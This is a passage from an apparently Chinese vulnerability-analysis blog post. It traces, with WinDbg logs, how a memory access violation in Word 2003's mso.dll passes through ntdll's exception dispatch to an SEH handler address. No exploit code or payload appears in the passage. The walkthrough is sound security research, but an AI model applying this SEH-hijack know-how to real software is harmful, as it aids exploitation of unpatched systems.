mso!Ordinal1246+<span class="number">0x16b0</span>(<span class="number">0x30ed442c</span>,发生异常指令地址)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;通过<code>栈回溯</code>，我们可以知道，<code>0x30ed442c</code>处的指令<code>“rep movsd”</code>发生<code>内存访问异常</code>后，系统首先将<code>异常信息</code>发送给<code>调试器</code>，调试器<code>未处理该异常</code>，则将控制权交给<code>ntdll!KiUserExceptionDispatcher</code>函数。接下来的<code>调用过程</code>如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ntdll!KiUserExceptionDispatcher(PEXCEPTION_RECORD ExceptionRecord, </span><br><span class="line">                                PCONTEXT ContextRecord)</span><br><span class="line">        |           |</span><br><span class="line">        ↓           ↓</span><br><span class="line">ntdll!RtlDispatchException(PEXCEPTION_RECORD ExceptionRecord, </span><br><span class="line">                           PCONTEXT ContextRecord)</span><br><span class="line">        |           |</span><br><span class="line">        ↓           ↓</span><br><span class="line">ntdll!RtlpExecuteHandlerForException(PEXCEPTION_RECORD pExcptRec, </span><br><span class="line">                                     PEXCEPTION_REGISTRATION_RECORD RegistrationPointer, </span><br><span class="line">                                     CONTEXT pContext,</span><br><span class="line">                                     DISPATCHER_CONTEXT DispatcherContext,</span><br><span class="line">                                     (PEXCEPTION_ROUTINE)RegistrationPointer-&gt;Handler)</span><br><span class="line">        |           |</span><br><span class="line">        ↓           ↓</span><br><span class="line">ntdll!ExecuteHandler(PEXCEPTION_RECORD pExcptRec, </span><br><span class="line">                     PEXCEPTION_REGISTRATION_RECORD RegistrationPointer, </span><br><span class="line">                     CONTEXT pContext,</span><br><span class="line">                     DISPATCHER_CONTEXT DispatcherContext,</span><br><span class="line">                     (PEXCEPTION_ROUTINE)RegistrationPointer-&gt;Handler)</span><br><span class="line">        |           |</span><br><span class="line">        ↓           ↓</span><br><span class="line">ntdll!ExecuteHandler2(PEXCEPTION_RECORD pExcptRec, </span><br><span class="line">                      PEXCEPTION_REGISTRATION_RECORD RegistrationPointer, </span><br><span class="line">                      CONTEXT pContext,</span><br><span class="line">                      DISPATCHER_CONTEXT DispatcherContext,</span><br><span class="line">                      (PEXCEPTION_ROUTINE)RegistrationPointer-&gt;Handler)</span><br><span class="line">        |           |</span><br><span class="line">        ↓           ↓</span><br><span class="line">WINWORD+0x1bdd(0x30001bdd),SEH处理程序地址</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我们对<code>上述函数</code>所在地址<code>下断点</code>，然后进行<code>跟踪</code>，查看<code>每个函数</code>的<code>参数内容</code>。由于这些函数的参数大多是<code>结构体指针</code>，所以我们用<code>WinDbg调试</code>可以更直观的看到这些<code>参数所对应的结构体内容</code>(dt命令)。WinDbg结合<code>符号文件</code>，可以非常清楚地显示<code>各类数据结构</code>。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">140.</span>b54): Break instruction exception - code <span class="number">80000003</span> (first chance)</span><br><span class="line"><span class="built_in">eax</span>=7ffda000 <span class="built_in">ebx</span>=<span class="number">00000001</span> <span class="built_in">ecx</span>=<span class="number">00000002</span> <span class="built_in">edx</span>=<span class="number">00000003</span> <span class="built_in">esi</span>=<span class="number">00000004</span> <span class="built_in">edi</span>=<span class="number">00000005</span></span><br><span class="line"><span class="built_in">eip</span>=7c92120e <span class="built_in">esp</span>=0336ffcc <span class="built_in">ebp</span>=0336fff4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=<span class="number">0038</span>  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">7c92120e cc              <span class="keyword">int</span>     <span class="number">3</span></span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C92E45C</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C92E465</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C94A9EA</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C923256</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C923275</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu 7C9232A6</span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; bu <span class="number">0x30001bdd</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\Microsoft Office\OFFICE11\WINWORD.EXE - </span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; <span class="built_in">bl</span></span><br><span class="line"> <span class="number">0</span> e 7c92e45c     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!KiUserExceptionDispatcher</span><br><span class="line"> <span class="number">1</span> e 7c92e465     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!KiUserExceptionDispatcher+<span class="number">0x9</span></span><br><span class="line"> <span class="number">2</span> e 7c94a9ea     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!RtlDispatchException+<span class="number">0xac</span></span><br><span class="line"> <span class="number">3</span> e 7c923256     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!ExecuteHandler</span><br><span class="line"> <span class="number">4</span> e 7c923275     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!ExecuteHandler+<span class="number">0x1f</span></span><br><span class="line"> <span class="number">5</span> e 7c9232a6     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** ntdll!ExecuteHandler2+<span class="number">0x24</span></span><br><span class="line"> <span class="number">6</span> e 30001bdd     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** WINWORD+<span class="number">0x1bdd</span></span><br><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> 5fdd0000 5fe25000   C:\WINDOWS\system32\netapi32.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 75c60000 75d00000   C:\WINDOWS\system32\urlmon.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 76d70000 76d92000   C:\WINDOWS\system32\Apphelp.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">06860000</span> 06a01000   C:\Program Files\Microsoft Office\OFFICE11\GdiPlus.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 76f20000 76f28000   C:\WINDOWS\system32\WTSAPI32.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 762d0000 762e0000   C:\WINDOWS\system32\WINSTA.dll</span><br><span class="line">(<span class="number">140.e28</span>): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=<span class="number">00000022</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=30ed442c <span class="built_in">esp</span>=001237b4 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010206</span></span><br><span class="line">*** ERROR: Symbol file could <span class="keyword">not</span> be found.  Defaulted to export symbols for C:\Program Files\<span class="meta">Common</span> Files\Microsoft Shared\office11\mso.dll - </span><br><span class="line">mso!Ordinal1246+<span class="number">0x16b0</span>:</span><br><span class="line">30ed442c f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>] &lt;----发生异常</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; gn</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=<span class="number">00000022</span> <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92e45c <span class="built_in">esp</span>=001234c4 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">ntdll!KiUserExceptionDispatcher:</span><br><span class="line">7c92e45c 8b4c2404        <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">4</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:001234c8=001234e8</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">001234c4  001234cc 001234e8 c0000005 <span class="number">00000000</span></span><br><span class="line">001234d4  <span class="number">00000000</span> 30ed442c <span class="number">00000002</span> <span class="number">00000001</span></span><br><span class="line">001234e4  <span class="number">00130000</span> 0001003f <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">001234f4  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123504</span>  ffff037f ffff0000 ffffffff 30d582a7</span><br><span class="line"><span class="number">00123514</span>  <span class="number">00000000</span> <span class="number">00000000</span> ffff0000 ff354963</span><br><span class="line"><span class="number">00123524</span>  <span class="number">00000000</span> 4963ffff 0000ff35 ffff0000</span><br><span class="line"><span class="number">00123534</span>  <span class="number">00000000</span> <span class="number">00000000</span> 0000ffff <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_RECORD 001234cc</span><br><span class="line">ntdll!_EXCEPTION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> ExceptionCode    : 0n-<span class="number">1073741819</span> &lt;---- <span class="number">16</span>进制补码(C0000005),EXCEPTION_INVALID_VIOLATION,读写内存违规</span><br><span class="line">   +<span class="number">0x004</span> ExceptionFlags   : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> ExceptionRecord  : (null) </span><br><span class="line">   +<span class="number">0x00c</span> ExceptionAddress : <span class="number">0x30ed442c</span> Void &lt;---- 发生异常的指令地址</span><br><span class="line">   +<span class="number">0x010</span> NumberParameters : <span class="number">2</span></span><br><span class="line">   +<span class="number">0x014</span> ExceptionInformation : [<span class="number">15</span>] <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _CONTEXT 001234e8 </span><br><span class="line">ntdll!_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> ContextFlags     : <span class="number">0x1003f</span></span><br><span class="line">   +<span class="number">0x004</span> <span class="built_in">Dr0</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> <span class="built_in">Dr1</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x00c</span> <span class="built_in">Dr2</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x010</span> <span class="built_in">Dr3</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x014</span> Dr6              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x018</span> Dr7              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x01c</span> FloatSave        : _FLOATING_SAVE_AREA</span><br><span class="line">   +<span class="number">0x08c</span> SegGs            : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x090</span> SegFs            : <span class="number">0x3b</span></span><br><span class="line">   +<span class="number">0x094</span> SegEs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x098</span> SegDs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x09c</span> <span class="built_in">Edi</span>              : <span class="number">0x130000</span></span><br><span class="line">   +<span class="number">0x0a0</span> <span class="built_in">Esi</span>              : <span class="number">0x1104c830</span></span><br><span class="line">   +<span class="number">0x0a4</span> <span class="built_in">Ebx</span>              : <span class="number">0x5000000</span></span><br><span class="line">   +<span class="number">0x0a8</span> <span class="built_in">Edx</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0ac</span> <span class="built_in">Ecx</span>              : <span class="number">0x22</span></span><br><span class="line">   +<span class="number">0x0b0</span> <span class="built_in">Eax</span>              : <span class="number">0xc8ac</span></span><br><span class="line">   +<span class="number">0x0b4</span> <span class="built_in">Ebp</span>              : <span class="number">0x1237ec</span></span><br><span class="line">   +<span class="number">0x0b8</span> <span class="built_in">Eip</span>              : <span class="number">0x30ed442c</span></span><br><span class="line">   +<span class="number">0x0bc</span> SegCs            : <span class="number">0x1b</span></span><br><span class="line">   +<span class="number">0x0c0</span> EFlags           : <span class="number">0x10206</span></span><br><span class="line">   +<span class="number">0x0c4</span> <span class="built_in">Esp</span>              : <span class="number">0x1237b4</span></span><br><span class="line">   +<span class="number">0x0c8</span> SegSs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x0cc</span> ExtendedRegisters : [<span class="number">512</span>]  <span class="string">"???"</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">1</span> hit</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=001234cc <span class="built_in">ecx</span>=001234e8 <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92e465 <span class="built_in">esp</span>=001234bc <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">ntdll!KiUserExceptionDispatcher+<span class="number">0x9</span>:</span><br><span class="line">7c92e465 e8e6c40100      <span class="keyword">call</span>    ntdll!RtlDispatchException (7c94a950)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">001234bc  001234cc 001234e8 001234cc 001234e8</span><br><span class="line">001234cc  c0000005 <span class="number">00000000</span> <span class="number">00000000</span> 30ed442c</span><br><span class="line">001234dc  <span class="number">00000002</span> <span class="number">00000001</span> <span class="number">00130000</span> 0001003f</span><br><span class="line">001234ec  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">001234fc  <span class="number">00000000</span> <span class="number">00000000</span> ffff037f ffff0000</span><br><span class="line">0012350c  ffffffff 30d582a7 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012351c  ffff0000 ff354963 <span class="number">00000000</span> 4963ffff</span><br><span class="line">0012352c  0000ff35 ffff0000 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; t</span><br><span class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=001234cc <span class="built_in">ecx</span>=001234e8 <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104c830 <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c94a950 <span class="built_in">esp</span>=001234b8 <span class="built_in">ebp</span>=001237ec iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">ntdll!RtlDispatchException:</span><br><span class="line">7c94a950 8bff            <span class="keyword">mov</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">2</span> hit</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c92e4f4 <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c94a9ea <span class="built_in">esp</span>=<span class="number">00123430</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!RtlDispatchException+<span class="number">0xac</span>:</span><br><span class="line">7c94a9ea e85888fdff      <span class="keyword">call</span>    ntdll!RtlpExecuteHandlerForException (7c923247)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line"><span 